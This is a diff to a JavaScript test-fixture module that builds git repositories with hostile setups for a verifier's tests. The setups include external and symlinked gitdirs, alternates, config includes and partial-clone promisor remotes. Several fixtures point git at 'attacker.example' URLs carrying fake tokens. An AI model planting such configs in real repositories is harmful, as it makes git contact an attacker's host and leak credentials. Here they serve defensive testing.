@@ -4,7 +4,7 @@
 // verifier module exists.
 
 import { spawn } from 'node:child_process';
-import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
+import { mkdir, mkdtemp, rename, rm, symlink, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
 
@@ -266,4 +266,204 @@ export async function createNonGitDirectory() {
     headSha: 'b'.repeat(40),
     extra: {},
   });
+}
+
+export async function createLinkedWorktreeRepo() {
+  const main = await createLinearRepo();
+  const linkedParent = await mkdtemp(path.join(tmpdir(), 'p14-linked-'));
+  const linkedRoot = path.join(linkedParent, 'wt');
+  await runFixtureGit(main.path, ['worktree', 'add', '-b', 'linked-head', linkedRoot, main.headSha]);
+  return {
+    path: linkedRoot,
+    baseSha: main.baseSha,
+    headSha: main.headSha,
+    extra: { mainPath: main.path },
+    cleanup: async () => {
+      try {
+        await runFixtureGit(main.path, ['worktree', 'remove', '--force', linkedRoot]);
+      } catch {
+        await cleanupRepo(linkedRoot);
+      }
+      await cleanupRepo(linkedParent);
+      await main.cleanup();
+    },
+  };
+}
+
+export async function createExternalGitdirRepo() {
+  const repo = await createLinearRepo();
+  const externalRoot = await mkdtemp(path.join(tmpdir(), 'p14-extgit-'));
+  const externalGit = path.join(externalRoot, 'hostile.git');
+  await rename(path.join(repo.path, '.git'), externalGit);
+  await writeFile(path.join(repo.path, '.git'), `gitdir: ${externalGit}\n`, 'utf8');
+  const originalCleanup = repo.cleanup;
+  repo.extra = { ...repo.extra, externalGit };
+  repo.cleanup = async () => {
+    await originalCleanup();
+    await cleanupRepo(externalRoot);
+  };
+  return repo;
+}
+
+export async function createSymlinkGitdirRepo() {
+  const repo = await createLinearRepo();
+  const externalRoot = await mkdtemp(path.join(tmpdir(), 'p14-symgit-'));
+  const externalGit = path.join(externalRoot, 'hostile.git');
+  await rename(path.join(repo.path, '.git'), externalGit);
+  await symlink(externalGit, path.join(repo.path, '.git'));
+  const originalCleanup = repo.cleanup;
+  repo.extra = { ...repo.extra, externalGit };
+  repo.cleanup = async () => {
+    await originalCleanup();
+    await cleanupRepo(externalRoot);
+  };
+  return repo;
+}
+
+export async function createAlternatesRepo() {
+  const donor = await createLinearRepo();
+  const repo = await createLinearRepo();
+  const infoDir = path.join(repo.path, '.git', 'objects', 'info');
+  await mkdir(infoDir, { recursive: true });
+  await writeFile(
+    path.join(infoDir, 'alternates'),
+    `${path.join(donor.path, '.git', 'objects')}\n`,
+    'utf8',
+  );
+  const originalCleanup = repo.cleanup;
+  repo.extra = { ...repo.extra, donorPath: donor.path, donorHeadSha: donor.headSha };
+  repo.cleanup = async () => {
+    await originalCleanup();
+    await donor.cleanup();
+  };
+  return repo;
+}
+
+export async function createHttpAlternatesRepo() {
+  const repo = await createLinearRepo();
+  const infoDir = path.join(repo.path, '.git', 'objects', 'info');
+  await mkdir(infoDir, { recursive: true });
+  await writeFile(
+    path.join(infoDir, 'http-alternates'),
+    'https://attacker.example/objects?token=SUPERSECRET\n',
+    'utf8',
+  );
+  return repo;
+}
+
+export async function createPromisorPackRepo() {
+  const repo = await createLinearRepo();
+  const packDir = path.join(repo.path, '.git', 'objects', 'pack');
+  await mkdir(packDir, { recursive: true });
+  await writeFile(path.join(packDir, 'pack-deadbeef.promisor'), '', 'utf8');
+  return repo;
+}
+
+export async function createPartialCloneConfigRepo() {
+  const repo = await createLinearRepo();
+  await runFixtureGit(repo.path, ['config', 'extensions.partialClone', 'origin']);
+  await runFixtureGit(repo.path, ['config', 'remote.origin.promisor', 'true']);
+  await runFixtureGit(repo.path, ['config', 'remote.origin.partialclonefilter', 'blob:none']);
+  await runFixtureGit(repo.path, ['config', 'remote.origin.url', 'https://attacker.example/steal.git']);
+  return repo;
+}
+
+const HOSTILE_INCLUDE_BYTES = `[extensions]
+	partialClone = origin
+[remote "origin"]
+	url = https://attacker.example/steal.git?token=SUPERSECRET
+	promisor = true
+	partialclonefilter = blob:none
+`;
+
+function attachCleanup(repo, extraRoots) {
+  const originalCleanup = repo.cleanup;
+  repo.cleanup = async () => {
+    await originalCleanup();
+    for (const root of extraRoots) await cleanupRepo(root);
+  };
+  return repo;
+}
+
+async function writeHostileIncludeFile(prefix) {
+  const externalRoot = await mkdtemp(path.join(tmpdir(), prefix));
+  const includeFile = path.join(externalRoot, 'hostile.cfg');
+  await writeFile(includeFile, HOSTILE_INCLUDE_BYTES, 'utf8');
+  return { externalRoot, includeFile };
+}
+
+export async function createAbsoluteExternalIncludeRepo() {
+  const repo = await createLinearRepo();
+  const { externalRoot, includeFile } = await writeHostileIncludeFile('p14-absinc-');
+  await runFixtureGit(repo.path, ['config', 'include.path', includeFile]);
+  repo.extra = { ...repo.extra, includeFile, token: 'SUPERSECRET' };
+  return attachCleanup(repo, [externalRoot]);
+}
+
+export async function createRelativeExternalIncludeRepo() {
+  const repo = await createLinearRepo();
+  const { externalRoot, includeFile } = await writeHostileIncludeFile('p14-relinc-');
+  const relative = path.relative(path.join(repo.path, '.git'), includeFile);
+  await runFixtureGit(repo.path, ['config', 'include.path', relative]);
+  repo.extra = { ...repo.extra, includeFile, relative, token: 'SUPERSECRET' };
+  return attachCleanup(repo, [externalRoot]);
+}
+
+export async function createActiveIncludeIfRepo() {
+  const repo = await createLinearRepo();
+  const { externalRoot, includeFile } = await writeHostileIncludeFile('p14-incif-');
+  await runFixtureGit(repo.path, ['config', 'includeIf.onbranch:main.path', includeFile]);
+  repo.extra = { ...repo.extra, includeFile, token: 'SUPERSECRET' };
+  return attachCleanup(repo, [externalRoot]);
+}
+
+export async function createSymlinkExternalIncludeRepo() {
+  const repo = await createLinearRepo();
+  const { externalRoot, includeFile } = await writeHostileIncludeFile('p14-syminc-');
+  const linkPath = path.join(repo.path, '.git', 'included.cfg');
+  await symlink(includeFile, linkPath);
+  await runFixtureGit(repo.path, ['config', 'include.path', 'included.cfg']);
+  repo.extra = { ...repo.extra, includeFile, linkPath, token: 'SUPERSECRET' };
+  return attachCleanup(repo, [externalRoot]);
+}
+
+export async function createBenignIncludeRepo() {
+  const repo = await createLinearRepo();
+  const externalRoot = await mkdtemp(path.join(tmpdir(), 'p14-benigninc-'));
+  const includeFile = path.join(externalRoot, 'benign.cfg');
+  await writeFile(includeFile, '[user]\n\tname = p14-benign\n', 'utf8');
+  await runFixtureGit(repo.path, ['config', 'include.path', includeFile]);
+  repo.extra = { ...repo.extra, includeFile };
+  return attachCleanup(repo, [externalRoot]);
+}
+
+export async function createLinkedWorktreePromisorConfigRepo() {
+  const linked = await createLinkedWorktreeRepo();
+  await runFixtureGit(linked.extra.mainPath, ['config', 'extensions.worktreeConfig', 'true']);
+  await runFixtureGit(linked.path, ['config', '--worktree', 'remote.origin.promisor', 'true']);
+  await runFixtureGit(linked.path, [
+    'config', '--worktree', 'remote.origin.partialclonefilter', 'blob:none',
+  ]);
+  await runFixtureGit(linked.path, [
+    'config', '--worktree', 'remote.origin.url',
+    'https://attacker.example/worktree.git?token=WTSECRET',
+  ]);
+  linked.extra = { ...linked.extra, token: 'WTSECRET' };
+  return linked;
+}
+
+export async function createLinkedWorktreeBenignConfigRepo() {
+  const linked = await createLinkedWorktreeRepo();
+  await runFixtureGit(linked.extra.mainPath, ['config', 'extensions.worktreeConfig', 'true']);
+  await runFixtureGit(linked.path, ['config', '--worktree', 'user.name', 'p14-linked-benign']);
+  return linked;
+}
+
+export async function createAnnotatedTagBranchRepo() {
+  const repo = await createLinearRepo();
+  await runFixtureGit(repo.path, ['tag', '-a', 'forged-base', '-m', 'forged annotated base', repo.baseSha]);
+  const tagSha = await runFixtureGit(repo.path, ['rev-parse', 'forged-base']);
+  await writeFile(path.join(repo.path, '.git', 'refs', 'heads', 'main'), `${tagSha}\n`, 'utf8');
+  repo.extra = { ...repo.extra, tagSha };
+  return repo;
 }
